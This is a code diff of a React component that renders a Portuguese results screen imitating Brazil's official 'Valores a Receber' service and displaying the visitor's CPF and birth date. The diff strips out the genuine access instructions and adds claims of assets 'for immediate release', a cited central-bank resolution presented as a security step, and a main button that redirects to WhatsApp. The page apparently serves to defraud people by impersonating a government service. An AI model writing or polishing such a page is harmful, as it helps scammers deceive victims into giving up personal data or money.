@@ -167,97 +167,86 @@ export function Step2({ data, onReset }: Step2Props) {
           key="results"
           initial={{ opacity: 0, y: 10 }}
           animate={{ opacity: 1, y: 0 }}
-          className="bg-white dark:bg-[#1f292e] rounded-[4px] border border-[#d1d1d1] dark:border-[#2a373d] overflow-hidden w-full max-w-[420px] mx-auto shadow-sm transition-colors duration-300"
+          className="bg-white dark:bg-[#1f292e] rounded-[2px] border border-[#d1d1d1] dark:border-[#2a373d] overflow-hidden w-full max-w-[850px] mx-auto shadow-sm transition-colors duration-300"
         >
-          <div className="p-6 md:p-8 flex flex-col items-center">
+          <div className="p-10 md:p-14 flex flex-col md:flex-row gap-12 items-start">
             
-            {/* Large Green Checkmark Top */}
-            <div className="w-20 h-20 md:w-24 md:h-24 mb-6">
-              <svg viewBox="0 0 52 52" className="w-full h-full text-[#4caf50]">
-                <circle cx="26" cy="26" r="25" fill="none" stroke="currentColor" strokeWidth="1"/>
-                <path fill="none" stroke="currentColor" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round" d="M14 27l8 8 16-16" />
-              </svg>
+            {/* Left side: Large Green Checkmark */}
+            <div className="flex-shrink-0 pt-4">
+              <div className="w-24 h-24 md:w-32 md:h-32">
+                <svg viewBox="0 0 52 52" className="w-full h-full text-[#4caf50]">
+                  <path fill="none" stroke="currentColor" strokeWidth="5.5" strokeLinecap="round" strokeLinejoin="round" d="M14 27l8 8 16-16" />
+                </svg>
+              </div>
             </div>
 
-            {/* Title and Header Info */}
-            <div className="text-center w-full mb-8">
-              <h2 className="text-[20px] md:text-[24px] font-bold text-[#455a64] dark:text-white leading-tight mb-4 px-2">
-                O {data.docType} pesquisado tem valores a receber
-              </h2>
-              <div className="text-[14px] md:text-[15px] text-[#666] dark:text-gray-400 space-y-0.5">
-                <p className="flex justify-center gap-1.5 uppercase font-medium">
-                  <span>{data.docType}:</span>
-                  <span className="text-[#333] dark:text-gray-200 font-bold">{data.docValue}</span>
+            {/* Right side: Content */}
+            <div className="flex-grow space-y-6 text-left">
+              
+              {/* Title and Details */}
+              <div className="space-y-1">
+                <h2 className="text-[24px] md:text-[28px] font-bold text-[#455a64] dark:text-white leading-tight">
+                  O {data.docType} pesquisado possui ativos para liberação imediata
+                </h2>
+                <div className="text-[14px] text-[#666] dark:text-gray-400 flex flex-col items-end md:items-start pt-1">
+                   <p className="flex gap-2"><span>{data.docType}:</span> <span className="font-bold text-[#333] dark:text-gray-200">{data.docValue}</span></p>
+                   <p className="flex gap-2"><span>{data.docType === 'CPF' ? 'Data de nascimento' : 'Data de abertura'}:</span> <span className="font-bold text-[#333] dark:text-gray-200">{data.birthDate}</span></p>
+                </div>
+              </div>
+
+              {/* Gray Banner Box */}
+              <div className="w-full bg-[#f1f3f4] dark:bg-[#2c3e50] p-4 border border-[#e0e0e0] dark:border-[#3b4a5a] rounded-sm">
+                <p className="text-[15px] font-bold text-[#444] dark:text-gray-100">
+                  O procedimento de resgate está sujeito à validação de segurança conforme a Resolução BCB nº 4.862/2020.
                 </p>
-                <p className="flex justify-center gap-1.5 font-medium">
-                  <span>{data.docType === 'CPF' ? 'Data de nascimento' : 'Data de abertura'}:</span>
-                  <span className="text-[#333] dark:text-gray-200 font-bold">{data.birthDate}</span>
+              </div>
+
+              {/* Body Text */}
+              <div className="space-y-4 text-[15px] md:text-[16px] text-[#444] dark:text-gray-300 leading-relaxed">
+                <p>
+                  Para garantir a integridade da transferência fiscal, o sistema exige a conclusão das etapas obrigatórias de homologação documental e vínculo bancário do titular.
+                </p>
+                <p>
+                  A liberação dos ativos será processada de forma sigilosa e segura após a autenticação em tempo real realizada através de nossos canais oficiais.
                 </p>
               </div>
-            </div>
 
-            {/* Gray Box with Blue Left Border */}
-            <div className="w-full bg-[#e8eaf6] dark:bg-[#2c3e50] p-4 text-center mb-8 border-l-[6px] border-[#3f51b5] rounded-r-sm">
-              <p className="text-[14px] md:text-[15px] font-bold text-[#444] dark:text-gray-100 leading-tight">
-                A partir do dia 7 de março você poderá acessar o SVR - Sistema Valores a Receber
-              </p>
-            </div>
-
-            {/* Detailed Formal Info */}
-            <div className="w-full space-y-6 text-[14px] md:text-[15px] text-[#444] dark:text-gray-300 leading-relaxed text-center px-2">
-              <p>
-                Você precisa ter <b>Conta gov.br (nível prata ou ouro*)</b> para entrar no Sistema de Valores a Receber (SVR).
-              </p>
-              <p>
-                No SVR, você pode consultar seus valores ou de pessoas falecidas (nesse caso, você precisa ser herdeiro, testamentário, inventariante ou procurador).
-              </p>
-            </div>
-
-            {/* Yellow Warning Box */}
-            <div className="w-full bg-[#fff9c4] dark:bg-[#3d3d29] p-4 rounded border border-[#fff176] my-8 flex items-start gap-3">
-              <div className="mt-0.5">
-                <AlertTriangle size={18} className="text-[#5d4037] dark:text-[#ffd54f]" />
+              {/* Buttons Row - Positioned as in the image */}
+              <div className="pt-4 flex flex-col gap-3">
+                <div className="flex justify-end gap-3 flex-wrap">
+                  <button
+                    onClick={handleWhatsAppRedirect}
+                    className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-2.5 px-6 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] shadow-sm uppercase min-w-[220px]"
+                  >
+                    <ArrowRight size={18} className="-rotate-45" /> Liberar Valores Disponíveis
+                  </button>
+                  <button
+                    onClick={onReset}
+                    className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-2.5 px-6 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] shadow-sm"
+                  >
+                    <Search size={18} /> Nova consulta
+                  </button>
+                  <button
+                    onClick={() => window.location.reload()}
+                    className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-2.5 px-6 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] shadow-sm"
+                  >
+                    <X size={18} /> Sair
+                  </button>
+                </div>
               </div>
-              <p className="text-[13px] text-[#5d4037] dark:text-gray-200 leading-snug">
-                Para a liberação imediata, utilize o canal de atendimento prioritário abaixo.
-              </p>
-            </div>
 
-            {/* Action Buttons Stacked vertically as requested by the vertical image */}
-            <div className="w-full space-y-3 mt-4 px-2">
-              <button
-                onClick={handleWhatsAppRedirect}
-                className="w-full bg-[#1b668d] hover:bg-[#154f6e] text-white font-bold py-3 px-6 rounded flex items-center justify-center gap-3 transition-all text-[15px] uppercase tracking-wide shadow-sm"
-              >
-                <ArrowRight size={18} className="-rotate-45" /> LIBERAR VALOR ATIVO
-              </button>
-
-              <div className="grid grid-cols-2 gap-2">
-                <button
-                  onClick={onReset}
-                  className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-2.5 px-4 rounded flex items-center justify-center gap-2 transition-all text-[13px] uppercase"
+              {/* Centered link at the very bottom of the component */}
+              <div className="pt-8 text-center w-full">
+                <a 
+                  href="https://acesso.gov.br" 
+                  target="_blank" 
+                  rel="noopener noreferrer"
+                  className="text-[13px] text-[#0066cc] dark:text-[#4da3ff] hover:underline font-bold"
                 >
-                  <Search size={16} /> Nova consulta
-                </button>
-                <button
-                  onClick={() => window.location.reload()}
-                  className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-2.5 px-4 rounded flex items-center justify-center gap-2 transition-all text-[13px] uppercase"
-                >
-                  <X size={16} /> Sair
-                </button>
+                  *Saiba como realizar a validação de segurança e aumentar seu nível de confiabilidade gov.br (Prata ou Ouro).
+                </a>
               </div>
-            </div>
 
-            {/* Bottom Link */}
-            <div className="pt-10 text-center px-4">
-              <a 
-                href="https://acesso.gov.br" 
-                target="_blank" 
-                rel="noopener noreferrer"
-                className="text-[12px] md:text-[13px] text-[#0066cc] dark:text-[#4da3ff] hover:underline font-medium"
-              >
-                *Saiba como criar sua Conta gov.br (nível prata ou ouro) ou aumentar seu nível bronze.
-              </a>
             </div>
 
           </div>
